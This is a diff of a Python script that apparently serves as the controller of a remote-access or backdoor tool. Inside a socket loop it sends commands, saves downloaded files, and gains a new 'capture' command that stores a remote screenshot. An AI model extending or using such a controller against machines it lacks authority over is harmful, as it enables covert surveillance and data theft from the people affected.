@@ -65,8 +65,10 @@ while True:
     commande_split = command.split(" ") 
     if len(commande_split) == 2 and commande_split[0] == "dl":
         dl_filename = commande_split[1]
+    elif len(commande_split) == 2 and commande_split[0] == "capture":
+        dl_filename = commande_split[1] + ".png"
+        
     data_receive = socket_send_command_and_receive_all_data(connection_socket, command)
-    
     if not data_receive:
         break
     
@@ -78,7 +80,8 @@ while True:
             f.write(data_receive)
             f.close()
             print("File", dl_filename, "download")
-        dl_filename = None  
+        dl_filename = None 
+        
     else:
     #print(f"data_receive longueur : {len(data_receive)}")
         print(data_receive.decode())
